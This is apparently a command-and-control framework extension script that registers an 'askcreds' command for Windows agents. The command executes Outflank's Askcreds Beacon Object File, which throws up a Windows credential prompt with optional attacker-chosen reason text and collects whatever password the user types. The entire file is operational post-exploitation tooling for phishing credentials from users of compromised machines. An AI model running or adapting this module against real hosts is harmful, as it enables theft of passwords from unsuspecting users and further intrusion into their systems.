var metadata = {
    name: "Askcreds",
    description: "Collect passwords using CredUIPromptForWindowsCredentialsName"
};

var cmd_askcreds = ax.create_command("askcreds", "Collect passwords using CredUIPromptForWindowsCredentialsName", "askcreds [reason]");
cmd_askcreds.addArgString("reason", false, "Optional reason text shown in the credential prompt");
cmd_askcreds.setPreHook(function (id, cmdline, parsed_json) {
    var reason   = parsed_json["reason"] || "";
    var bof_path = ax.script_dir() + "Askcreds." + ax.arch(id) + ".o";
    var message  = "Task: Askcreds BOF by Outflank — waiting max 60s for user input";

    if (reason === "") {
        ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, message);
    } else {
        var bof_params = ax.bof_pack("wstr", [reason]);
        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
    }
});

var group_askcreds = ax.create_commands_group("Askcreds-BOF", [cmd_askcreds]);
ax.register_commands_group(group_askcreds, ["beacon", "gopher", "kharon"], ["windows"], []);
